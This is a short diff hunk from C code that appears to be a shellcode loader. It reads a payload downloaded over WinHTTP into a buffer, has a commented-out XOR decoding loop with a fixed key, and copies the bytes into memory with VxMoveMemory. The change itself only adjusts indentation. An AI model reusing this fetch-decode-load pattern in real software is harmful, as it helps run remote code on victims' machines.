@@ -71,8 +71,8 @@ int main() {
 			pszOutBuffer = (unsigned char*)calloc(dwSize+1, sizeof(unsigned char));
 			ZeroMemory(pszOutBuffer, dwSize + 1);
 			WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,dwSize, &dwDownloaded);
-	        // char key[] = { 0x12, 0x34, 0x56, 0x78, 0x90, 0x12, 0x34, 0x56, 0x78, 0x90 };
-            // for (int i = 0; i < dwSize; ++i){
+	        	// char key[] = { 0x12, 0x34, 0x56, 0x78, 0x90, 0x12, 0x34, 0x56, 0x78, 0x90 };
+            		// for (int i = 0; i < dwSize; ++i){
 			// 	pszOutBuffer[i] ^= key[i % sizeof(key)];
 			// }
 			VxMoveMemory((PVOID)hptr, pszOutBuffer, dwSize);
